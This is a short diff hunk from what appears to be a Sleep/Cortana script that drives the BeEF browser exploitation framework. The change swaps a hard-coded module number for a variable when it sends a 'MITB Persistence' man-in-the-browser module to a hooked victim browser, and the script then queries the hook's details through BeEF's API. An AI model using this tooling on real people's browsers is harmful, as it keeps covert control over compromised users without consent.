@@ -351,7 +351,7 @@ sub build_profile {
 		host_add(@beef_hosts[$1]["ip"]);
 		$sid = @beef_hosts[$1]["sessionID"];
 		append($console, "\c9 [+] Send MiTB module for Persistence.");	
-		send_beefcmd_with_param($sid, 32, "", 0); # MITB Persistence #
+		send_beefcmd_with_param($sid, $code_mitb, "", 0); # MITB Persistence #
 		host_os(@beef_hosts[$1]["ip"],@beef_hosts[$1]["OS"]);
 		$link = "" . $beefUrl . "/api/hooks/" . $sid . "?token=" . $key . "";
 		$details = [BeefRequester BeefGetRequest: "$link"];#sleep(100);
